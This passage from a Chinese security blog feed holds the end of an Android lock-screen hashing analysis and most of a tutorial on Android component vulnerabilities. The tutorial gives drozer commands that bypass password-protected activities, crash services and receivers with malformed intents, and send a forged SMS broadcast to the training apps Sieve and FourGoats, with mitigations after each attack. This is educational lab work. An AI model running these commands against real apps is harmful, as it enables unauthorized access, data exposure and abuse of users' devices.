class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/android/service/gatekeeper/IGateKeeperService.aidl</span></span><br><span class="line"><span class="number">54</span>      <span class="comment">/**</span></span><br><span class="line"><span class="comment">55       * Verifies an enrolled handle against a provided, plaintext blob.</span></span><br><span class="line"><span class="comment">56       * <span class="doctag">@param</span> uid The Android user ID associated to this enrollment</span></span><br><span class="line"><span class="comment">57       * <span class="doctag">@param</span> challenge a challenge to authenticate agaisnt the device credential. If successful</span></span><br><span class="line"><span class="comment">58       *                  authentication occurs, this value will be written to the returned</span></span><br><span class="line"><span class="comment">59       *                  authentication attestation.</span></span><br><span class="line"><span class="comment">60       * <span class="doctag">@param</span> enrolledPasswordHandle The handle against which the provided password will be</span></span><br><span class="line"><span class="comment">61       *                               verified.</span></span><br><span class="line"><span class="comment">62       * <span class="doctag">@param</span> The plaintext blob to verify against enrolledPassword.</span></span><br><span class="line"><span class="comment">63       * <span class="doctag">@return</span> a VerifyResponse with an attestation, or null on failure.</span></span><br><span class="line"><span class="comment">64       */</span></span><br><span class="line"><span class="number">65</span>      GateKeeperResponse <span class="title function_">verifyChallenge</span><span class="params">(<span class="type">int</span> uid, <span class="type">long</span> challenge, in <span class="type">byte</span>[] enrolledPasswordHandle,</span></span><br><span class="line"><span class="params"><span class="number">66</span>              in <span class="type">byte</span>[] providedPassword)</span>;</span><br></pre></td></tr></table></figure><h1 id="4-疑惑点"><a href="#4-疑惑点" class="headerlink" title="4. 疑惑点"></a>4. 疑惑点</h1><h2 id="4-1-找不到对应文件"><a href="#4-1-找不到对应文件" class="headerlink" title="4.1 找不到对应文件"></a>4.1 找不到对应文件</h2><p>话说在3.9 writeCredentialHash()时，把密钥hash写到了<code>/data/system/gatekeeper.pattern.key</code>中，而且在1.5 readCredentialHash()中，也需要将密钥从<code>/data/system/gatekeeper.pattern.key</code>取出来，所以为什么在手机中没有找到这个文件呢？</p><h2 id="4-2-接口函数"><a href="#4-2-接口函数" class="headerlink" title="4.2 接口函数"></a>4.2 接口函数</h2><p>在3中，每次走到如何加密明文时，都是启动一个服务，给它发送明文，返回的响应请求就是密文了。这些函数难道是接口函数，让开发者自定义的吗？还是从源码中就能找到，只是我没找到？可是既然有源码，所以这些函数的实现肯定是Android源码中的，我是真没找到啊</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;看了姜维大佬写的《Android应用安全防护和逆向分析》一书中对Android 5.1的锁屏密码加密算法分析，我也依样画葫芦对我手上的Android 8.1.0锁屏密码加密算法进行分析，其实源码并没有多大改变，我这仅仅只是做一个复现过程。&lt;/p&gt;</summary>
    
    
    
    <category term="Android安全" scheme="http://example.com/categories/Android%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Android App四大组件漏洞</title>
    <link href="http://example.com/posts/3ea91662.html"/>
    <id>http://example.com/posts/3ea91662.html</id>
    <published>2022-10-20T09:51:24.663Z</published>
    <updated>2022-11-17T06:24:37.786Z</updated>
    
    <content type="html"><![CDATA[<p>学习参考文章：</p><p><a href="https://www.cnblogs.com/wjrblogs/p/13953761.html">Drozer 测试 APP - Sieve&amp;FourGoats </a></p><p><a href="https://github.com/WindXaa">WindXaa</a>/<a href="https://github.com/WindXaa/Android-Vulnerability-Mining">Android-Vulnerability-Mining</a></p><p><a href="https://ayesawyer.github.io/2019/08/21/Android-App%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">Android App常见安全漏洞</a></p><span id="more"></span><h1 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1. 环境配置"></a>1. 环境配置</h1><p>Python环境一定是2.7版本：<a href="https://www.python.org/downloads/release/python-2718/">https://www.python.org/downloads/release/python-2718/</a></p><p>在Windows下切换Python2和Python3：<a href="https://www.cnblogs.com/qtzd/p/14728029.html">https://www.cnblogs.com/qtzd/p/14728029.html</a> ，也就是说Path环境变量中哪个Python版本在前，系统默认用哪个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python --version</span><br></pre></td></tr></table></figure><p><strong>Java环境也最好切换到jdk 1.5</strong>，否则执行某些drozer命令会失败。</p><p>下载Java SE5：<a href="https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/1.5.0_22/jdk-1_5_0_22-windows-amd64.exe">https://www.oracle.com/webapps/redirect/signon?nexturl=https://download.oracle.com/otn/java/jdk/1.5.0_22/jdk-1_5_0_22-windows-amd64.exe</a></p><p>Windows下切换Java版本：<a href="https://blog.csdn.net/zouxucong/article/details/76577080">https://blog.csdn.net/zouxucong/article/details/76577080</a></p><p><strong>新开一个cmd</strong>，可以看到版本切到Java 1.5了：</p><img src="/posts/3ea91662/5.1.3.png" class=""><p>在github下载drozer：<a href="https://github.com/WithSecureLabs/drozer">https://github.com/WithSecureLabs/drozer</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/FSecureLABS/drozer.git</span><br><span class="line">cd drozer</span><br><span class="line">python.exe setup.py bdist_msi</span><br><span class="line">.\dist\drozer-2.4.3.win-amd64.msi</span><br></pre></td></tr></table></figure><p>选择在Python 2.7环境下安装drozer：</p><img src="/posts/3ea91662/1.1.2.png" class=""><img src="/posts/3ea91662/1.1.1.png" class=""><p>安装protobuf组件，否则等下执行<code>drozer console connect</code>会报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install protobuf</span><br></pre></td></tr></table></figure><p>安装OpenSSL组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyopenssl</span><br></pre></td></tr></table></figure><p>安装pyyaml组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyyaml</span><br></pre></td></tr></table></figure><p>安装twisted组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twisted</span><br></pre></td></tr></table></figure><p>安装service_identity组件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install service_identity</span><br></pre></td></tr></table></figure><p><strong>解决drozer中文乱码的问题：</strong></p><p>在<code>C:\Python27\Lib\site-packages\drozer\modules\app\package.py</code>中开头插入以下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在List类中的以下两处增加“u”即可：</p><img src="/posts/3ea91662/1.1.4.png" class=""><p>安装drozer出错及解决方案：<a href="https://www.freesion.com/article/768646023/">https://www.freesion.com/article/768646023/</a></p><p>下载drozer agent：<a href="https://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">https://github.com/FSecureLABS/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</a> ，安装到手机上。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install drozer-agent-2.3.4.apk</span><br></pre></td></tr></table></figure><p>启动drozer agent，绑定drozer默认端口31415：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:31415 tcp:31415</span><br><span class="line">drozer console connect</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/1.1.3.png" class=""><p>样本APK安装到手机：</p><p>sieve.apk：<a href="https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk">https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk</a> </p><p>FourGoats.apk：<a href="https://pan.baidu.com/s/1DuDGn04nMu3hUXacGFTwVQ?pwd=abcd">https://pan.baidu.com/s/1DuDGn04nMu3hUXacGFTwVQ?pwd=abcd</a></p><h1 id="2-Activity"><a href="#2-Activity" class="headerlink" title="2. Activity"></a>2. Activity</h1><p>在Android系统中，Activity默认是不导出的。如果设置了exported = “true” 这样的关键值或者是添加了<intent-filter>这样的属性，那么此时Activity是导出的，就会导致越权绕过或者是泄露敏感信息等安全风险。</p><h2 id="2-1-越权绕过"><a href="#2-1-越权绕过" class="headerlink" title="2.1 越权绕过"></a>2.1 越权绕过</h2><h3 id="2-1-1-原理介绍"><a href="#2-1-1-原理介绍" class="headerlink" title="2.1.1 原理介绍"></a>2.1.1 原理介绍</h3><p>一些敏感的界面需要用户输入密码才能查看，如果没有对调用此Activity的组件进行权限验证，就会造成验证的越权问题，导致攻击者不需要密码就可以打开。</p><h3 id="2-1-2-漏洞复现"><a href="#2-1-2-漏洞复现" class="headerlink" title="2.1.2 漏洞复现"></a>2.1.2 漏洞复现</h3><p>列出手机中所有的App包，找到我们的sieve.apk：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run app.package.list</span><br><span class="line"></span><br><span class="line">或者过滤一下：</span><br><span class="line">run app.package.list -f sieve</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/2.1.1.png" class=""><p>查看具体包的信息，包括版本号、数据目录、使用权限等：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.info -a com.mwr.example.sieve</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/2.1.5.png" class=""><p>查询目标应用的攻击面，可以知道该APK四大组件分别被允许导出的个数，该APK是可调试的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.package.attacksurface com.mwr.example.sieve</span><br><span class="line">Attack Surface:</span><br><span class="line">  3 activities exported</span><br><span class="line">  0 broadcast receivers exported</span><br><span class="line">  2 content providers exported</span><br><span class="line">  2 services exported</span><br><span class="line">    is debuggable</span><br></pre></td></tr></table></figure><p>查看哪3个Activity是被导出的，被导出的Activity可以通过强制跳转实现越权绕过，也就是不用登录就可以进入到其它页面，其中进入<code>com.mwr.example.sieve.PWList</code>发现存储的用户信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run app.activity.info -a  com.mwr.example.sieve</span><br><span class="line">run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/2.1.2.png" class=""><p>这其实跟使用frida-objection中的intent功能是一样的。呃…经试验这几个Activity其实都可以直接跳过去。</p><img src="/posts/3ea91662/2.1.4.png" class=""><h3 id="2-1-3-防护策略"><a href="#2-1-3-防护策略" class="headerlink" title="2.1.3 防护策略"></a>2.1.3 防护策略</h3><p>(1)私有Activity不应被其他应用启动相对是安全的，创建Activity时：设置exported属性为false</p><p>(2)公开暴露的Activity组件，可以被任意应用启动，创建Activity时：设置exported属性为true，谨慎处理接收的Intent，返回数据不包含敏感信息，不应发送敏感信息，收到返回数据谨慎处理</p><h2 id="2-2-钓鱼欺诈-Activity劫持"><a href="#2-2-钓鱼欺诈-Activity劫持" class="headerlink" title="2.2 钓鱼欺诈/Activity劫持"></a>2.2 钓鱼欺诈/Activity劫持</h2><h3 id="2-2-1-原理介绍"><a href="#2-2-1-原理介绍" class="headerlink" title="2.2.1 原理介绍"></a>2.2.1 原理介绍</h3><p>Android App中不同界面的切换通过Activity的调度来实现，而Acticity的调度是由Android系统中的AMS来实现。每个应用想启动或停止一个进程，都报告给AMS，AMS收到启动或停止Activity的消息时，先更新内部记录，再通知相应的进程或停止指定的Activity。当新的Activity启动，前一个Activity就会停止，这些Activity会保留在系统中的一个Activity历史栈中。每有一个Activity启动，它就压入历史栈顶，并在手机上显示。当用户按下back，顶部的Activity弹出，恢复前一个Activity，栈顶指向当前的Activity。</p><p>由于Activity的这种特性，如果在启动一个Activity时，给它加入一个标志位FLAG_ACTIVITY_NEW_TASK,就能使它置于栈顶并立马呈现给用户，如果这个Activity是用于盗号的伪装Activity，就会产生钓鱼安全事件或者一个Activity中有Webview加载，允许加载任意网页都有可能产生钓鱼事件。</p><h3 id="2-2-2-防护策略"><a href="#2-2-2-防护策略" class="headerlink" title="2.2.2 防护策略"></a>2.2.2 防护策略</h3><p>目前，对activity劫持的防护，只能是适当给用户警示信息。一些简单的防护手段就是显示当前运行的进程提示框。梆梆加固则是在进程切换的时候给出提示，并使用白名单过滤。</p><p>比如旅行青蛙被切换到后台后，会弹出提示框：</p><img src="/posts/3ea91662/2.2.1.jpg" class=""><h2 id="2-3-隐式启动Intent包含敏感数据"><a href="#2-3-隐式启动Intent包含敏感数据" class="headerlink" title="2.3 隐式启动Intent包含敏感数据"></a>2.3 隐式启动Intent包含敏感数据</h2><h3 id="2-3-1-原理介绍"><a href="#2-3-1-原理介绍" class="headerlink" title="2.3.1 原理介绍"></a>2.3.1 原理介绍</h3><p>Intent可分为隐式(implicitly)和显式(explicitly)两种：</p><p>(1)显式Intent：即在构造Intent对象时就指定接收者，它一般用在知道目标组件名称的前提下，一般是在相同的应用程序内部实现的，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(MainActivity.<span class="built_in">this</span>, NewActivity.class);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p>(2)隐式Intent：即Intent的发送者在构造Intent对象时，并不知道也不关心接收者是谁，有利于<br>降低发送者和接收者之间的耦合，它一般用在没有明确指出目标组件名称的前提下，一般是用于<br>不同应用程序之间，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.wooyun.test&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p>对于显式Intent，Android不需要去做解析，因为目标组件已经很明确，Android需要解析的是那些<br>隐式Intent。通过解析，将Intent映射给可以处理此Intent的Activity，IntentReceiver或Service。</p><p>有一个应用A，采用Intent隐式传递，它的动作是“X”。此时还有一个应用B，动作也是“X”，我们在启动的时候，通过Intent隐式传递，就会同时弹出两个界面，我们就不知道到底启动A还是B。</p><h2 id="2-4-拒绝服务攻击"><a href="#2-4-拒绝服务攻击" class="headerlink" title="2.4 拒绝服务攻击"></a>2.4 拒绝服务攻击</h2><h3 id="2-4-1-原理介绍"><a href="#2-4-1-原理介绍" class="headerlink" title="2.4.1 原理介绍"></a>2.4.1 原理介绍</h3><p>Android提供Intent机制来协助应用间的交互和通讯，通过Intent实现对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android通过Intent的描述，负责找到对应组件，完成调用。</p><p>拒绝服务攻击源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者向应用发送此类空数据、异常或者畸形数据来达到使该应用崩溃的目的。本地拒绝服务可以被竞争方利用来攻击，使得己方应用崩溃，造成破坏。</p><p>危害：拒绝服务漏洞对于锁屏应用、安全防护类软件危害是巨大的。</p><h3 id="2-4-2-防护策略"><a href="#2-4-2-防护策略" class="headerlink" title="2.4.2 防护策略"></a>2.4.2 防护策略</h3><p>异常类型有：空指针异常、类型转换异常、数组越界访问异常、类未定义异常、其它异常。谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做try/catch处理，以及对不符合预期数据做异常处理。</p><p>1.不需要被外部调用的Activity设置android:exported=”false”；</p><p>2.若需要外部调用，需自定义signature或者signatureOrSystem级别的权限；</p><p>3.注册的组件请严格校验输入参数，注意空值判定和类型转换判断。</p><h1 id="3-Service"><a href="#3-Service" class="headerlink" title="3. Service"></a>3. Service</h1><p>Service(服务)是一种可以在后台执行长时间运行操作而没有用户界面的应用组件。服务可由其他应用组件启动(如Activity)，服务一旦被启动将在后台一直运行，即使启动服务的组件(Activity)已销毁也不受影响。 此外，组件可以绑定到服务，以与之进行交互，甚至是执行进程间通信 (IPC)。</p><p>如果一个导出的Service没有做严格的限制，任何应用都可以去启动并绑定到这个Service上，取决于被暴露的功能， 这可以是一个应用去执行未授权的行为，获取敏感信息或污染修改内部应用的状态造成威胁。</p><h2 id="3-1-权限提升"><a href="#3-1-权限提升" class="headerlink" title="3.1 权限提升"></a>3.1 权限提升</h2><h3 id="3-1-1-原理介绍"><a href="#3-1-1-原理介绍" class="headerlink" title="3.1.1 原理介绍"></a>3.1.1 原理介绍</h3><p>当一个Service配置了intent-filter默认是被导出的，如果没对调用Service进行权限，限制或者是没有对调用者的身份进行有效验证，那么恶意构造的App都可以对此Service传入恰当的参数进行调用，导致恶意行为发生比如调用具有system权限的删除卸载服务删除卸载其他应用。</p><h2 id="3-2-Service劫持"><a href="#3-2-Service劫持" class="headerlink" title="3.2 Service劫持"></a>3.2 Service劫持</h2><h3 id="3-2-1-原理介绍"><a href="#3-2-1-原理介绍" class="headerlink" title="3.2.1 原理介绍"></a>3.2.1 原理介绍</h3><p>隐式启动Service，当存在同名Service，先安装应用的Service优先级高。</p><h2 id="3-3-消息伪造"><a href="#3-3-消息伪造" class="headerlink" title="3.3 消息伪造"></a>3.3 消息伪造</h2><h3 id="3-3-1-原理介绍"><a href="#3-3-1-原理介绍" class="headerlink" title="3.3.1 原理介绍"></a>3.3.1 原理介绍</h3><p>暴露的Service对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Service接收可能产生安全隐患。</p><h2 id="3-4-拒绝服务攻击"><a href="#3-4-拒绝服务攻击" class="headerlink" title="3.4 拒绝服务攻击"></a>3.4 拒绝服务攻击</h2><h3 id="3-4-1-原理介绍"><a href="#3-4-1-原理介绍" class="headerlink" title="3.4.1 原理介绍"></a>3.4.1 原理介绍</h3><p>Service的拒绝服务主要来源于Service启动时对接收的Intent等没有做异常情况下的处理，导致程序崩溃。主要体现在给Service传输的intent或者传输序列化对象导致接收时候的类型传化异常。</p><p>Service拒绝服务攻击和Activity拒绝服务攻击的原理一样。</p><h3 id="3-4-2-漏洞复现"><a href="#3-4-2-漏洞复现" class="headerlink" title="3.4.2 漏洞复现"></a>3.4.2 漏洞复现</h3><p>查看FourGoats攻击面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure><p>查看针对 Service 组件具体的攻击面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dz&gt; run app.service.info -a org.owasp.goatdroid.fourgoats</span><br><span class="line">Package: org.owasp.goatdroid.fourgoats</span><br><span class="line">  org.owasp.goatdroid.fourgoats.services.LocationService</span><br><span class="line">    Permission: null</span><br><span class="line"></span><br><span class="line">dz&gt;</span><br></pre></td></tr></table></figure><p>由于运行 Service 组件需要找到对应的 action，所以将APK载入Android Killer反编译，打开<code>AndroidManifest.xml</code>文件查找 action：</p><img src="/posts/3ea91662/3.4.1.png" class=""><p>发送不完整intent造成拒绝服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/3.4.2.png" class=""><h3 id="3-4-3-防护策略"><a href="#3-4-3-防护策略" class="headerlink" title="3.4.3 防护策略"></a>3.4.3 防护策略</h3><p>（1）私有Service不定义intent-filter并且设置exported为false</p><p>（2）公开的service设置exported为true，intent-filter可以定义或者不定义</p><p>（3）合作Service需对合作方的App签名做校验</p><p>（4）只被应用本身使用的Service应设置为私有</p><p>（5）Service接收的数据需要谨慎处理</p><p>（6）内部Service需要使用签名级别的protectionLevel来判断是否未内部应用调用</p><p>（7）不应在Service创建（onCreate方法被调用）的时候决定是否提供服务，应在onStartCommand/onBind/onHandleIntent等方法被调用时做判断</p><p>（8）当Service有返回数据的时候，因判断数据接收App是否有信息泄露的风险</p><p>（9）有明确的服务需调用时使用显示Intent</p><p>（10）尽量不发送敏感信息</p><p>（11）启动Activity时不设置intent的FLAG_ACTIVITY_NEW_TASK标签</p><h1 id="4-Broadcast-Receiver"><a href="#4-Broadcast-Receiver" class="headerlink" title="4. Broadcast Receiver"></a>4. Broadcast Receiver</h1><p>Android中的每个应用程序都可以对自己感兴趣的广播进行注册，这样该程序只会收到自己所关心的广播内容，这些广播可以是来自系统的，也可能是来自其他程序的。Android提供了一套完整的API，允许应用程序自由地发送和接收广播。</p><p>广播机制分为两个方面：广播发送者和广播接收者，一般来说，BroadcastReceiver就是广播接收者。</p><p>广播接收者有两种注册方式：静态注册、动态注册。</p><ul><li>静态注册：在<code>AndroidManifest.xml</code>里通过<receive>标签声明</li><li>动态注册：需要在功能代码中进行注册<br>（1）实例化自定义的广播接收者，我们实现广播的功能，可以继承BroadcastReceiver类，并重写类中的方法<code>onReceive()</code><br>（2）实例化intentFilter，并设置要过滤的广播类型<br>（3）使用Context的<code>registerReceiver(BroadcastReceiver,IntentFilter)</code>方法注册广播<br>（4）在<code>onPause()</code>方法中通过调用<code>unregisterReceiver()</code>方法来实现注销</li></ul><p>这里的广播实际上指的是intent。当发送一个广播时，系统会将发送的广播(intent)与系统中所有注册的符合条件的IntentFilter进行匹配，匹配成功，则执行相应的<code>onReceive()</code>函数。发送广播时，如果处理不当，恶意应用便可以嗅探，拦截广播，致使敏感数据泄露、拒绝服务攻击、伪造消息、越权操作等。</p><h2 id="4-1-敏感信息泄露"><a href="#4-1-敏感信息泄露" class="headerlink" title="4.1 敏感信息泄露"></a>4.1 敏感信息泄露</h2><h3 id="4-1-1-原理介绍"><a href="#4-1-1-原理介绍" class="headerlink" title="4.1.1 原理介绍"></a>4.1.1 原理介绍</h3><p>发送的intent没有明确指定接收者，而是简单地通过action进行匹配，恶意应用便可以注册一个广播接收者嗅探拦截到这个广播，如果这个广播存在敏感数据，就被恶意应用窃取了。</p><h3 id="4-1-2-防护策略"><a href="#4-1-2-防护策略" class="headerlink" title="4.1.2 防护策略"></a>4.1.2 防护策略</h3><p>尝试采用本地广播的方式，这样程序发出的广播就只能被App自身广播接收器接收：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;my-sensitive-event&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;event&quot;</span>,<span class="string">&quot;this is a test event&quot;</span>);</span><br><span class="line">LocalBroadcastManager.getInstance(<span class="built_in">this</span>).sendBroadcast(intent);</span><br></pre></td></tr></table></figure><h2 id="4-2-越权绕过"><a href="#4-2-越权绕过" class="headerlink" title="4.2 越权绕过"></a>4.2 越权绕过</h2><h3 id="4-2-1-原理介绍"><a href="#4-2-1-原理介绍" class="headerlink" title="4.2.1 原理介绍"></a>4.2.1 原理介绍</h3><p>动态注册的广播默认都是导出的，如果导出的BroadcastReceiver没有做权限控制，导致BroadcastReceiver组件可以接收一个外部可控的url、或者其他命令，导致攻击者可以越权利用应用的一些特定功能，比如发送恶意广播、伪造消息、任意应用下载安装、打开钓鱼网站等。</p><h2 id="4-3-消息伪造"><a href="#4-3-消息伪造" class="headerlink" title="4.3 消息伪造"></a>4.3 消息伪造</h2><h3 id="4-3-1-原理介绍"><a href="#4-3-1-原理介绍" class="headerlink" title="4.3.1 原理介绍"></a>4.3.1 原理介绍</h3><p>暴露的Receiver对外接收Intent，如果构造恶意的消息放在Intent中传输，被调用的Receiver接收可能产生安全隐患。</p><h2 id="4-4-拒绝服务攻击"><a href="#4-4-拒绝服务攻击" class="headerlink" title="4.4 拒绝服务攻击"></a>4.4 拒绝服务攻击</h2><h3 id="4-4-1-原理介绍"><a href="#4-4-1-原理介绍" class="headerlink" title="4.4.1 原理介绍"></a>4.4.1 原理介绍</h3><p>如果敏感的BroadcastReceiver没有设置相应的权限保护，很容易受到攻击。最常见的是拒绝服务攻击。拒绝服务攻击指的是，传递恶意畸形的intent数据给广播接收器，广播接收器无法处理异常导致crash。</p><p>拒绝服务攻击的危害视具体业务场景而定，比如一个安全防护产品的拒绝服务、锁屏应用的拒绝服务、支付进程的拒绝服务等危害就是巨大的。</p><h3 id="4-4-2-漏洞复现"><a href="#4-4-2-漏洞复现" class="headerlink" title="4.4.2 漏洞复现"></a>4.4.2 漏洞复现</h3><p>查看FourGoats攻击面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.package.attacksurface org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure><p>查看针对 broadcast receiver组件具体的攻击面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.info -a org.owasp.goatdroid.fourgoats</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/4.4.1.png" class=""><p>由于运行 broadcast receiver组件需要找到对应的 action，所以将APK载入Android Killer反编译，打开<code>AndroidManifest.xml</code>文件查找 action：</p><img src="/posts/3ea91662/4.4.2.png" class=""><p>发送不完整intent造成拒绝服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/4.4.3.png" class=""><p>我们还可以根据组件的类名找到对应的源码信息，发现需要两个参数 phoneNumber和message：</p><img src="/posts/3ea91662/4.4.4.png" class=""><p>构造恶意广播发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --extra string phoneNumber 18218423996 --extra string message hellomyfriend</span><br></pre></td></tr></table></figure><img src="/posts/3ea91662/4.4.5.png" class=""><h2 id="4-5-Broadcast-Receiver的安全防护"><a href="#4-5-Broadcast-Receiver的安全防护" class="headerlink" title="4.5 Broadcast Receiver的安全防护"></a>4.5 Broadcast Receiver的安全防护</h2><p>（1）私有广播接收器设置exported=”false”，并且不配置intent-filter。(私有广播接收器依然能接收到同UID的广播)。</p><p>（2）对接收来的广播进行验证。</p><p>（3）App内部之间的广播使用protectionLevel=”signature” 验证其是否真是内部App。</p><p>（4）返回结果时需注意接收App是否会泄露信息。</p><p>（5）发送的广播包含敏感信息时需指定广播接收器，使用显示intent或者setPackage(String packageName)。</p><p>（6）使用LocalBroadcastManager。</p><h1 id="5-Content-Provider"><a href="#5-Content-Provider" class="headerlink" title="5. Content Provider"></a>5. Content Provider</h1><p>Android中的数据存储方式：Shared Preferences、网络存储、文件存储、外部存储、SQLite，这些存储方式一般在单独的应用程序中实现数据共享，对于不同应用之间共享数据，就要借助Content Provider。</p><p>ContentProvider为存储和读取数据提供了统一的接口，使用表的形式来对数据进行封装，使用ContentProvider可以在不同的应用程序之间共享数据，统一数据的访问方式，保证数据的安全性。</p><p>当外部应用需要对ContentProvider中的数据进行添加、删除、修改及查询操作时，可以使用ContentResolver类来完成，要获取ContentResolver对象，可以使用Activity提供<code>getContentResolver()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Uri <span class="title function_">insert</span><span class="params">(Uri uri, ContentValues values)</span><span class="comment">//往ContentProvider添加数据；</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">(Uri uri, String selection, String[] selectionArgs)</span><span class="comment">//从ContentProvider删除数据；</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">update</span><span class="params">(Uri uri, ContentValues values, String selection, String[] selectionArgs)</span><span class="comment">//更新ContentProvider中的数据；</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> Cursor <span class="title function_">query</span><span class="params">(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)</span><span 